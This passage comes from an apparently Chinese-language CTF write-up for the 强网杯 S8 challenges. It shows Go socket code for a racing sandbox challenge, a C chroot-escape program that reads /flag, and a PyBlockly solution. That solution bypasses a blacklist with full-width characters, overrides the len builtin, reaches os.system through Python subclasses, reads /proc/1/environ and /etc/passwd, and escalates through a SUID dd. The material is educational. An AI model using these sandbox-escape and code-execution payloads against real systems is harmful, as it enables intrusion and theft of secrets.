  syscall<span class="token punctuation">.</span><span class="token function">Syscall</span><span class="token punctuation">(</span>syscall<span class="token punctuation">.</span>SYS_ALARM<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

  buf <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">12345</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">&#123;</span>
      n<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Recvfrom</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">||</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">break</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span> n <span class="token operator">!=</span> <span class="token number">12345</span> <span class="token punctuation">&#123;</span>
        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d: (%d) %x\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">,</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>多次重启靶机尝试竞争后 dump 出一个数据包</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">4</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">3807</span><span class="token punctuation">)</span> 6f7f43d654ddc2d697edf05a7a61ebd2177fa5497d2a71fc4b8621341ed983817b72490db9e2c46c5c09784935e81fbc681ad40cabfc868ca77e60e9b26ee80d63b26d191e748213d036f19b3bd8a25b6b5bacd6153ed5530400ff8946d635be7c053a36bda6cb3dd6ea207811b0eea4191ad4aa878abf8cbffc7aa2c6d15ec837c131d80cab8a5f5de1f0e71fb8a65b435b9cd61536d57b00002789b6d983c53ceaa90d49a6cb7d68a47c2902712fbc17125251f3f81dac583f6181c8d05ecca981f497dbaa5217d47a91c3d627159a96bb749a9c6aacc0473edbff5654bffb3cee4ad1b12dfc35a5db5c177270d7bc985edb1d4748be0e6e0e7e2c2b491245608c4c8e784585e92ea1396dfdda9f7a5ff49cdad4e98f0b48fd3ea2a991d18dfdad7d26566c83fee6d5600e71e12b1bc9564b555e10be0ae3ee1bcab8c15acee4edd5559323c2d4098d41d3b044ce62177fecd61726d523a1d25c52e19d8c7314327cd63aee48ba306029ef737a989007d3b9e22827b08ca6222ce03d3d1332688bbb518d271ab489e8f9673ed768d5157fecd61536d52b0c01c78900950a5150eb3529f9ee42c104ad280d3abd6c2e63569aeb12d082865537df4adf8999152881f65f18508617d4513112c8273bdda133c885d46552cb0886316b565207e1dc633529b12d9f591865a3911e496398081650a1f358f6831047bb69f14a5e614085f6c1b7ab8a5f5de5f2c71ff0aedda11bc884dde3044bc33d873d1ed98380f91e376f719ad5382f9bc544b90461978b06da1dd7913766154abbcd99f15cce1ce5355a8c638a16de567194be5dead2173567d6b02ab98a8ac12a755650502dd7bfcad6b12d9f591065a1492eb92b5f4c4a931dd7d8f6cb9d763ae930799a4560c935dce737da17d4d56dc373536ef6bf7fec9a93dcbd2757c128f93ae1cb4ee8478529f9a683f69409b80d3af92b13b47a5b1dd7d8b70ad84ab9ed99e15ecef4edf5559323c6d4018d51df346e8ef6093367f6b85abf8834a5e3ec9adecd4e384f7d687a47cc3aa8092743b1b54fc844d5bc159b53c9ce99673a2280d4d55360c909479c3c8ab7864c7c9b7651d19b9c76a513d762bc8a71c128fd26930899583b79a028ee42adc8b74f083ab1e8cc2c6e93e293ccbecb934226f1ad8999d944617d55932c3c2c0ce178ef2f80a25bcf705ad6b875b9881cad9be59545a775746335617212efed202d2845b1454718085edb5c5e10ba085c2212ed365536cd60c97d19187fae77b4798464c494633aae7dec9a9c821ceb4d89eb201b5de4cf74d83829f9a65b95db5a2d0daab1eadc2c5693948bfce6cb994a16b95567d5406081f611b72bc2d4018d69d3b094cecafe8d176563a63dcf84456f61d2154f09b8aff9e5356a072868a4cd45b91543d08316d3555e1fbe0ac837e9491ac41245284ab975cee0460a15209cd3b834ca9a9c2fe4d215adb98a90c12a665650522df7663529b1250f5d7deee4c1f635af54c49217d11b143a4fdccafe6d710dde89ac05b1995fef460a15209cd3b834ca9a9e0bc8ca1c574dc65e89a3d95e91060500587daa81aecb091465abf2328b4dd08102ff259f51baa7504ebbdd99895accb881f49edbaa736ea241609e3bd8a2595b5bacd21736d53b0002df8956910a1d3ceafe61705f5b955bdc2d0d727237bc586f1bf6d49009435885caa8c0b25acca181bcad90451a17de517be8545ce89a9eb4a4197f92b98a86c18a73116f1fc77c623529f6b9cb35a5db54467270abd081af641cd7d8f650f74eb1589dd8e4649789f98ae78cc2d4416bfaa63d1dfcd2170bf8725389f4030100b8e5956d41057463356070d5c335a9b1eacd3af963738c1658d9f785356b5b1330a104c3124560213cb296231a0a15209cd3b834ca522abe288c9c6a85290002eba5565c4ab1552bbc6ddd9683f47c091045b33e2b11d06f00f5f8dcf683588d76858d89991944f135de9b6b03871520b273ac35efd25ffc28bac1a93dcf84456f61d2154f09b8aff9e5356a072868a4cd45b9155bd0811aff559f51aaa7404ebbed99995ace30a135dee33bc276aeedf2db6791e57dcf372d71bc22feac92c1a25e5650dfe144f33a36bda6cb957b2d280d727217bc58165049f3e8bebac6732ae93695361d2c423171db451a1664f811ee309069162f222fd2173ed55b010052e43700cf48705179a037c05b959b2c280d727aa7a0559d17d11b143a4fdccafe6d710dde89ac05b1995fef460a15209cd3b834fadda12f8e6c5e6b84680008dbc51edb83c50227e5c3f6b9cbf9f2592445b3232b131a1658dedf33facb9b96aaa1bdc15ac0b2bd6e1d1851aa17d6a73112e39063055ffc288ac1a9c0c3000060e59718b23a3ce0f139a46583f47c0900e58df0639840d58739ff907f4221f97a28658991817094be64536b039c1520b8aac490691607222f5650a63dcf84456f61d2154f09b8aff9e5356a0735a9510c2dd1ff2f11c11252de9f5d3f8c95cd32a1bd8997ba6f4dc9559323c2d2cea97b9b3b9461951f36ed5ad053337143c528aa52d8438dfda2de2fb12f0a35a9fd6034fc8f1ed0819c93341f90376b164abf23bdc3124528ca3a75dfa88213646f0acb72513a9a3e8da41b5e6af30348c162471d910a0d3ceae46843a7cb7d2064fbef720ebad485041b542003be00ea467ab86f88339729442faadbf06816de5239d6220aa6f3c5371b48d54b20ea1a765c5256504b8cfdb33a36bda6cb9462d2d7f20b392b11cb1652dce627be0ad6c50361f548d10de9084caadbaa4c9c15a6c54a73d751035ff2d8495fa63dcf84456f61d2154f09b8aff9e5356a072868a4cd45b38547b040d3cf2e9ee1268c969033a1bd8997ba6f4d6d549323c6d452e5405549eda2fbd433618e822774ca470d22ac1ed9cb4cb52fbcf9b12f184cf264dffc73f6cc5940d3cf159ff130cb91e0325f423e5a44b6226d1d12c58aa1a256319ae59063015ff62ed31598b92a9ec19ada16aea68975a93a36bda6cb3419fd5e01727214b840d5ed555e081dc321c67a287e899b8451362096dbe264591180aad3fa33e99a9ea6ad239d6af103015a42e51daea38df79a7564e07d865cf964dfd476da6dd48190939407947f515c8bb8a1bfc1120859010e1fdbaa5b137468311afad8e8d217372d739f2b49024889a3e4cd39ca4cbd2ac2f0b52b9abd69daf245b90023d51185963c0f91094b5c8ffbe86e215bc69a89304c5a6eab97145ea9d71a1ea25bc437656bc1a9b9c2a68aeb24d4910a3435da3429f9a682aec161a59e3afb639840dd225d9fc100ca31f77b56648d338f2df0ad26da6b03861180b8d3ba19ead0177fa45b75694f024889a3e5cd3fca4cbc2ac2f1b52b82bd69daf145b90023d5118c973c0190094d5c8ff3e96e275bc69989304c536fab99155eafd31a2aa25bc6222fab5c2278c00000629ce184402d37723729696a072868a4cd45b91503d0818493141590ff4958f1f0a6bdc1124ae5ba7e5593a3b7149dbf799b345cc7d3177fa4209c6af1034809a3ad56d8418db5892fb9f6b9cb35a1d7280d7af9119c398c302e9b53f3e7441032e039c15bce7419724ad7238a17d87b0d8f72512a9bd697e1db1d8a0e1c4889e9260a1b68c245b13a36bda6cb35a5ff5d2c727276bcb54adb55520a828a5c8d30e936931aae65f8af10a2e3bba9b4e77b9b3b48ae58551cad1a646b840f00b0e1b569dfcbfc3613422fb1250f1d7dee60847edd13d08102ff659f517aa7900632a1f04a54752d42fd8593238a13d4ed5dc37a5cea9a928098afd865474c5fc8556c5eaca9cac2315726e6e6cb8be22c5c050b2b526e39a130139f53a1a3804eb9b3f548c40de90b34dc42451ab476e1f05873513a3ac4851365d0e1b52710c12a635650598cfda27da2bd82bb35aba10c8d3af963d08302ff659f5d2d8c942033a1bd2a520de30d1d08506e01fc2dbb799b76510f9b94bafcd715c181114889ee261e940ac1502ebe2bb42f8f592865a1c37270b9d1819f939693fc86cb9b8a1621bdc11209edcd7c1d1af0c6d695e1f06a77512c3a84841365d4ef070ccc06a3ad1e91089150137ca009eee2ab6ca6642942b4ee8c39125041f380bb08b37620a1bd8891817059724ad7238a12640a01893bd8e55166801365d4e38d2718c12ae93ae1cb4c2847056170eaef556ca46c2972b5eacc2c1e33ad37d9f6cb9b421699f54a5e614881f601b753c2d4018d49d3b0a4ce825bf4a8bed4267a4f6cf1ef264afdc389ff3f1171f6b9cb9439d2d7f2727aa7f8559d979655a8e483104bbb63f442d04d2c40ef2581238a13d6bf34122b90631c5ff636d315abb9880cadd3e59555a7457463356574a2ca35a9fe6484f2b1ea6944d71df57822097c5883c4d512899911449131de1153985f5de0fa5b3348a6eb9507fe9a9c196a4bc1c587955650dfe1442bbc55ddf683f464090045b38d47d0e0ac041cd7907dc7342e7a2af1e52a0deb9d590ddba8d67b6de1f2ef1f90a2596b5bbc73c6950efc007665e5272bfdf739e839d9b42d5aad202d28410329117041675ac5d7d8f6f5cf4ebb66f1e8c50ceb785d5793231ab7a6a2799b735b2eb24abca41189144b1748c1267f6ad2cf4e762bbe7bf1c05b96251cfa480b39526ee35d93e21190cf716e3e7f2ab1315fcef1297d5593451a1364790b7d72e16b3a177fecec412278c404a074e49568b3c774633a36bda6cb95bb26280d727aa7f8559d939e13b8ab40588b377305cb12fe48c97d559c3c8ab706c77c9bab14261edbb3205650a63dcf84456f61d2154f09b8aff9e5356a072868a4cd45b91503d0818493141490ff4858f1f1a6bdc1124ae5647c5593a3b7d4e1bf799b345c39d2177fa111da5abc88c859a3ad1e9807c53dda3529f9a6cbfd202d610cfbb0a27112ce929c2ed8f6c3107437e48c08f9692c4268cdc3358a1ed9ab36103712a757de0bfad215a9b9c2a084865201d98388ff6ff461707e5b96236819c4727027bc78165249f398be0a9c22b2a1bdc15ecc24ed255a8c638a17d8560db47fd75c85003e1a58dc1fd546473feacf5f2f42c4006a04f2bc97024cdfc62341b1b6430845d5d2555e1bbe0aceed6ee934025ecca8211ca26cdcc2d4098d39d7b09cce8a5ef625d215acb9880cadd3e59555a745746335c2cbee48b94070eb40b163138a085e96940b917547184bbb03cdd312452d425c181a00c3d694e1f05d73513a9a9cf3c81a9c6af14bc59da2e59729cf4cbd2bbcfff6b9cb951bd5d7f2727c95ec73165049f3a8beaac64ab9e599815cc86ccf31dec707d212d63309893bd8a351d4777cd7a5f089114889d0225650c7      <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> app.py 发送数据似乎是以 0x10000 的长度分包的，所以 http 接收到的不完整的数据大概率是 0x10000 边界末尾的数据</p>
<p>拿截获到的数据和 prog 相应位置的数据 XOR 一下，就能还原出 key 了</p>
<p>（但是我爆破了半天数据位置还是没爆出key。。）</p>
<p>因为sandbox程序中进行了 chroot，需要逃逸从而 open 获取 flag</p>
<p>这里我们控制了 prog 的内容，可以利用 go 程序跟 sandbox 进行交互，然后将 option 设置为1，就可以利用 ptrace 和 mount 之类的进行 chroot 逃逸了</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
<span class="token keyword">import</span> <span class="token punctuation">(</span>
  <span class="token string">"bufio"</span>
  <span class="token string">"bytes"</span>
  <span class="token string">"encoding/binary"</span>
  <span class="token string">"encoding/hex"</span>
  <span class="token string">"fmt"</span>
  <span class="token string">"os"</span>
  <span class="token string">"syscall"</span>
  <span class="token string">"unsafe"</span>
<span class="token punctuation">)</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  key<span class="token punctuation">,</span> err <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span><span class="token string">"&lt;key>"</span><span class="token punctuation">)</span>
  exe<span class="token punctuation">,</span> err <span class="token operator">:=</span> hex<span class="token punctuation">.</span><span class="token function">DecodeString</span><span class="token punctuation">(</span><span class="token string">"&lt;prog ELF>"</span><span class="token punctuation">)</span>

  socket<span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Socket</span><span class="token punctuation">(</span>syscall<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> syscall<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

  <span class="token keyword">var</span> addr syscall<span class="token punctuation">.</span>SockaddrInet4
  addr<span class="token punctuation">.</span>Port <span class="token operator">=</span> <span class="token number">2077</span>
  addr<span class="token punctuation">.</span>Addr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">&#123;</span><span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
  err <span class="token operator">=</span> syscall<span class="token punctuation">.</span><span class="token function">Connect</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> <span class="token operator">&amp;</span>addr<span class="token punctuation">)</span>

  chall <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>
  n<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Recvfrom</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> chall<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> i<span class="token punctuation">,</span> b <span class="token operator">:=</span> <span class="token keyword">range</span> key <span class="token punctuation">&#123;</span>
    chall<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> b
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">for</span> i<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token keyword">range</span> exe <span class="token punctuation">&#123;</span>
    exe<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token function">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">var</span> buf bytes<span class="token punctuation">.</span>Buffer
  writer <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewWriter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span>
  binary<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>writer<span class="token punctuation">,</span> binary<span class="token punctuation">.</span>LittleEndian<span class="token punctuation">,</span> <span class="token function">int32</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">len</span><span class="token punctuation">(</span>chall<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  binary<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>writer<span class="token punctuation">,</span> binary<span class="token punctuation">.</span>LittleEndian<span class="token punctuation">,</span> <span class="token function">int32</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  writer<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>chall<span class="token punctuation">)</span>
  writer<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>exe<span class="token punctuation">)</span>
  writer<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  syscall<span class="token punctuation">.</span><span class="token function">Sendto</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> buf<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>

  buf2 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> <span class="token boolean">true</span> <span class="token punctuation">&#123;</span>
    n<span class="token punctuation">,</span> <span class="token boolean">_</span><span class="token punctuation">,</span> err <span class="token operator">:=</span> syscall<span class="token punctuation">.</span><span class="token function">Recvfrom</span><span class="token punctuation">(</span>socket<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">||</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">break</span>
    <span class="token punctuation">&#125;</span>
    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> buf2<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>逃逸部分或许可以参考：<a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/10/15/sandbox/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/10/15/sandbox/</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">openat</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"../../../../../flag"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">read</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] from server\\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<hr>
<h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>是基于ast的沙箱</p>
<p>核心部分</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_audit_hook</span><span class="token punctuation">(</span>event_name<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"compile"</span><span class="token punctuation">,</span> <span class="token string">"memoryview"</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>event_name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Too Long!"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bad <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>
        <span class="token keyword">if</span> bad <span class="token keyword">in</span> event_name<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"No!"</span><span class="token punctuation">)</span>

<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'sys'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addaudithook<span class="token punctuation">(</span>my_audit_hook<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>目的是构造出<code>print(__builtins__.open(&#39;/flag&#39;).read())</code></p>
<p>那么利用点就是这里了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">blacklist_pattern <span class="token operator">=</span> <span class="token string">r"[!\"#$%&amp;'()*+,-./:;&lt;=>?@[\\\]^_`&#123;|&#125;~]"</span>


<span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'text'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> check_for_blacklisted_symbols<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span>  <span class="token string">"'"</span> <span class="token operator">+</span> unidecode<span class="token punctuation">.</span>unidecode<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试发现可以用全角字符绕过，unidecode 会转回半角字符</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">＇）；<span class="token keyword">print</span>（<span class="token builtin">open</span>（＂／proc／<span class="token number">1</span>／environ＂）．read（））＃<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">\uFF07\uFF09\uFF1B\u0070\u0072\u0069\u006E\u0074\uFF08\u006F\u0070\u0065\u006E\uFF08\uFF02\uFF0F\u0065\u0074\u0063\uFF0F\u0070\u0061\u0073\u0073\u0077\u0064\uFF02\uFF09\uFF0E\u0072\u0065\u0061\u0064\uFF08\uFF09\uFF09\uFF03<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102114758482.png" alt="image-20241102114758482"></p>
<p>发现不能直接读取flag，那还是要rce</p>
<p>那就要绕这个</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"popen"</span><span class="token punctuation">,</span> <span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"compile"</span><span class="token punctuation">,</span> <span class="token string">"memoryview"</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>event_name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">4</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Too Long!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-39">https://xz.aliyun.com/t/12647#toc-39</a></p>
<p>可以污染 len 函数使其返回的值固定为1来绕过长度检测</p>
<p>然后构造绕过hook blacklist</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__builtins__<span class="token punctuation">.</span><span class="token builtin">len</span><span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">[</span> x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token string">"'_sitebuiltins."</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> <span class="token string">"_Helper"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls / -lh'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>shell没弹成功，那就直接rce</p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102140501043.png" alt="image-20241102140501043"></p>
<p>find suid一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102140148914.png" alt="image-20241102140148914"></p>
<p>dd 提权读取flag即可</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241102140731646.png" alt="image-20241102140731646"></p>
<hr>
